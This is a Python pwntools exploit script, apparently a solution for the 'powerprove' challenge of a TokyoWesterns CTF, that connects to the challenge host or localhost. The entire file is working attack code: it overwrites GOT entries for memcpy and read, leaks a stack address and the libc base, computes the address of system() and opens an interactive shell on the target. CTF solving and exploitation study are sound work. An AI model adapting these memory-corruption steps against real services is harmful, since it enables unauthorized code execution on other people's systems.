#!/usr/bin/env python
# powerprove

from pwn import *
import sys

if len(sys.argv) > 1:
	host =  "pwn1.chal.ctf.westerns.tokyo"
	port = 19937
else:
	host = "localhost"
	port = 4000

s = remote(host, port)
sleep(5)

read_got  = 0x601028
memcpy_got = 0x601040
bss = 0x6010A8

def menu(index):
	s.recvuntil("choice:")
	s.sendline(str(index))

def addr(payload1, payload2, index):
	if(index == 1):
		s.sendline("\x00")
	else:
		menu(1)

	s.recvuntil("addr")
	s.sendline(str(payload1))
	s.recvuntil("addr")
	s.sendline(str(payload2))

def pwn(payload):
	menu(2)
	s.send(payload)

if __name__ == "__main__":
	addr(memcpy_got, read_got, 0)
	menu(2)

	addr(0,0x601050, 0)
	pwn(p64(0x4006B0))

	sleep(1)
	s.recvuntil("Your choice: \n")
	s.sendline("AAAAAAA")
	s.recvuntil("AAAAAAA\n")
	stack = u64(s.recv(6).ljust(8, "\x00"))
	log.info("stack              : " + hex(stack))

	s.recvuntil("Your choice: \n")
	s.sendline("")
	s.recvuntil("\n")
	libc_base = u64(("\x00" + s.recv(5)).ljust(8, "\x00")) - 0x3c5600
	system_addr = libc_base + 0x45390

	log.info("libc               : " + hex(libc_base))
	log.info("system_addr        : " + hex(system_addr))

	addr(0, 0x601050, 1)
	s.sendline("2\x00")
	sleep(0.5)
	s.sendline(p64(system_addr))

	s.interactive()
